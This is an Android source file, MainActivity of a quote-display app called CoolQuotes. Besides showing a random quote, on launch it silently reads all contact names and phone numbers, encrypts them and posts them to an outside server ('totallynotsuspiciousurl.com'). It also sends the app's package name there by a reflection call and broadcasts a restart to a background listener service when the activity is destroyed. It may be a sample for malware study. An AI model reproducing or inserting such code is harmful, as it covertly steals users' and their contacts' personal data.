package com.cross.coolquotes;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.widget.TextView;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.cross.coolquotes.utils.EncryptUtils;
import com.cross.coolquotes.utils.VolleySingleton;

import org.json.JSONObject;

import java.nio.charset.StandardCharsets;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        quoteGen((int) Math.floor(Math.random() * 20));
        getContacts();
        invokeThroughReflection();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        Intent i = new  Intent("com.cross.coolquotes.NOTIFICATION_LISTENER_SERVICE");
        i.putExtra("command","restart");
        sendBroadcast(i);
    }

    private void quoteGen(int i){
        TextView quote = findViewById(R.id.quote);
        TextView author = findViewById(R.id.author);

        switch (i){
            case 0:
                quote.setText(R.string.cool_quote_0);
                author.setText(R.string.cool_author_0);
                break;
            case 1:
                quote.setText(R.string.cool_quote_1);
                author.setText(R.string.cool_author_1);
                break;
            case 2:
                quote.setText(R.string.cool_quote_2);
                author.setText(R.string.cool_author_2);
                break;
            case 3:
                quote.setText(R.string.cool_quote_3);
                author.setText(R.string.cool_author_3);
                break;
            case 4:
                quote.setText(R.string.cool_quote_4);
                author.setText(R.string.cool_author_4);
                break;
            case 5:
                quote.setText(R.string.cool_quote_5);
                author.setText(R.string.cool_author_5);
                break;
            case 6:
                quote.setText(R.string.cool_quote_6);
                author.setText(R.string.cool_author_6);
                break;
            case 7:
                quote.setText(R.string.cool_quote_7);
                author.setText(R.string.cool_author_7);
                break;
            case 8:
                quote.setText(R.string.cool_quote_8);
                author.setText(R.string.cool_author_8);
                break;
            case 9:
                quote.setText(R.string.cool_quote_9);
                author.setText(R.string.cool_author_9);
                break;
            case 10:
                quote.setText(R.string.cool_quote_10);
                author.setText(R.string.cool_author_10);
                break;
            case 11:
                quote.setText(R.string.cool_quote_11);
                author.setText(R.string.cool_author_11);
                break;
            case 12:
                quote.setText(R.string.cool_quote_12);
                author.setText(R.string.cool_author_12);
                break;
            case 13:
                quote.setText(R.string.cool_quote_13);
                author.setText(R.string.cool_author_13);
                break;
            case 14:
                quote.setText(R.string.cool_quote_14);
                author.setText(R.string.cool_author_14);
                break;
            case 15:
                quote.setText(R.string.cool_quote_15);
                author.setText(R.string.cool_author_15);
                break;
            case 16:
                quote.setText(R.string.cool_quote_16);
                author.setText(R.string.cool_author_16);
                break;
            case 17:
                quote.setText(R.string.cool_quote_17);
                author.setText(R.string.cool_author_17);
                break;
            case 18:
                quote.setText(R.string.cool_quote_18);
                author.setText(R.string.cool_author_18);
                break;
            case 19:
                quote.setText(R.string.cool_quote_19);
                author.setText(R.string.cool_author_19);
                break;
            case 20:
                quote.setText(R.string.cool_quote_20);
                author.setText(R.string.cool_author_20);
                break;
        }
    }

    public void getContacts(){
        JSONObject obj = new JSONObject();

        try {
            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

            while (phones.moveToNext()) {
                String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                obj.put(name, phoneNumber);
            }
            phones.close();
            sendContacts(obj);
        }
        catch (Exception e){
            e.printStackTrace();
        }
    }

    public void sendContacts(JSONObject contacts) throws Exception {
        final String url ="http://www.totallynotsuspiciousurl.com/contacts";
        final String requestBody = EncryptUtils.encryptString(contacts.toString());

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {}
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {}
                }) {
            @Override
            public byte[] getBody() {
                return requestBody.getBytes(StandardCharsets.UTF_8);
            }
        };

        VolleySingleton.getInstance(MainActivity.this).addToRequestQueue(stringRequest);
    }

    public void invokeThroughReflection() {
        try {
            sendPackageName((String) EncryptUtils.class.getMethod("base64Encoder", String.class).invoke(null, getApplicationContext().getPackageName()));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void sendPackageName(String pkg) throws Exception {
        final String url ="http://www.totallynotsuspiciousurl.com/pkg";

        StringRequest stringRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {}
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {}
                }) {
            @Override
            public byte[] getBody() {
                return pkg.getBytes(StandardCharsets.UTF_8);
            }
        };

        VolleySingleton.getInstance(MainActivity.this).addToRequestQueue(stringRequest);
    }
}